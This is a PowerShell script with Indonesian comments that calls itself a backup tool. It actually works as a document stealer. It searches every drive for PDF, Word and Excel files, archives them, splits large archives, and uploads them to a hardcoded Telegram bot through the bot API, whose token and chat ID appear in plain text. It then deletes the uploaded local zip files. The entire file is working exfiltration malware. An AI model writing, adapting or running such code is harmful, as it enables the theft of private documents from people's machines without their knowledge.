# Fungsi untuk membagi file zip menjadi beberapa bagian berdasarkan ukuran maksimum
function Split-ZipFile {
    param (
        [string]$ZipFilePath,
        [string]$OutPrefix,
        [int]$BufferSize
    )

    $stream = [System.IO.File]::OpenRead($ZipFilePath)
    $chunkNum = 1
    $barr = New-Object byte[] $BufferSize
    $zipFiles = @()

    while ($bytesRead = $stream.Read($barr, 0, $BufferSize)) {
        $outFile = "$OutPrefix$chunkNum.zip"
        $ostream = [System.IO.File]::OpenWrite($outFile)
        $ostream.Write($barr, 0, $bytesRead)
        $ostream.Close()
        Write-Host "[+] Wrote $outFile"
        $zipFiles += $outFile
        $chunkNum++
    }
    $stream.Close()
    return $zipFiles
}

# Fungsi untuk mengirimkan file zip ke Telegram
function SendZipFilesToTelegram {
    param (
        [array]$ZipFiles,
        [string]$ChatId,
        [string]$BotToken
    )

    foreach ($zipFile in $ZipFiles) {
        if (Test-Path -Path $zipFile -PathType Leaf) {
            Write-Host "[!] sending file $zipFile to telegram .."
            Send-TelegramFile -FilePath $zipFile -ChatId $ChatId -BotToken $BotToken
            Remove-Item -Path $zipFile
        }
    }
}

# Fungsi untuk mengirim file ke Telegram
function Send-TelegramFile {
    param (
        [string]$FilePath,
        [string]$ChatId,
        [string]$BotToken
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $boundary = [System.Guid]::NewGuid()
    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}

    $body = [System.Text.StringBuilder]::new()
    $body.AppendLine("--$boundary")
    $body.AppendLine("Content-Disposition: form-data; name=`"chat_id`"")
    $body.AppendLine("")
    $body.AppendLine($ChatId)
    $body.AppendLine("--$boundary")
    $body.AppendLine("Content-Disposition: form-data; name=`"document`"; filename=`"$($FilePath | Split-Path -Leaf)`"")
    $body.AppendLine("Content-Type: application/octet-stream")
    $body.AppendLine("")
    $body.AppendLine([System.Text.Encoding]::UTF8.GetString($fileBytes))
    $body.AppendLine("--$boundary--")

    $uploadUrl = "https://api.telegram.org/bot$BotToken/sendDocument"
    Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body $body.ToString() | Out-Null
}

# Dapatkan daftar semua drive yang tersedia di sistem
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -match "^[A-Z]$" }

# Variabel untuk menyimpan daftar file zip yang akan dikirim
$zipFilesToSend = @()

foreach ($drive in $drives) {
    # Tentukan direktori sumber file
    $sourceDirectory = $drive.Root
    # Tentukan direktori tujuan untuk menyimpan file backup di folder Dokumen Pengguna
    $destinationDirectory = "C:\Backup\$($drive.Name)"
    # Buat direktori backup jika belum ada
    if (!(Test-Path -Path $destinationDirectory -PathType Container)) {
        New-Item -ItemType Directory -Path $destinationDirectory | Out-Null
    }
    # Kumpulkan file PDF, DOCX, DOC, dan Excel dari direktori sumber dan subdirektori
    $fileTypes = "*.pdf", "*.docx", "*.doc", "*.xlsx"
    Get-ChildItem -Path $sourceDirectory -Include $fileTypes -File -Recurse | ForEach-Object {
        Write-Host "[+] found file: $($_.FullName)"
        # Tentukan nama file untuk file backup
        $destinationFile = Join-Path -Path $destinationDirectory -ChildPath $_.Name
        # Salin file ke direktori backup
        Copy-Item -Path $_.FullName -Destination $destinationFile -Force
        Write-Host "[*] $($_.FullName) was copy to $destinationFile"
    }
    Write-Host "[+] backup done."
    # Tentukan nama dan jalur lengkap untuk file zip
    $zipFileName = "Backup_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".zip"
    $zipFilePath = Join-Path -Path "C:\Backup" -ChildPath $zipFileName
    # Kompres folder backup menjadi file zip
    Compress-Archive -Path "C:\Backup" -DestinationPath $zipFilePath
    Write-Host "[+] created archive done: $zipFilePath"

    # Memisahkan file zip jika ukuran lebih besar dari batas tertentu
    $maxZipSize = 50MB
    if ((Get-Item $zipFilePath).length -gt $maxZipSize) {
        $splitFiles = Split-ZipFile -ZipFilePath $zipFilePath -OutPrefix "C:\Backup\Split_" -BufferSize 20MB
        SendZipFilesToTelegram -ZipFiles $splitFiles -ChatId "1016142976" -BotToken "1121990746:AAFrZiHUoInz4tmx2yzUvgVqszLTDetltQw"
    } else {
        SendZipFilesToTelegram -ZipFiles @($zipFilePath) -ChatId "1016142976" -BotToken "1121990746:AAFrZiHUoInz4tmx2yzUvgVqszLTDetltQw"
    }
}
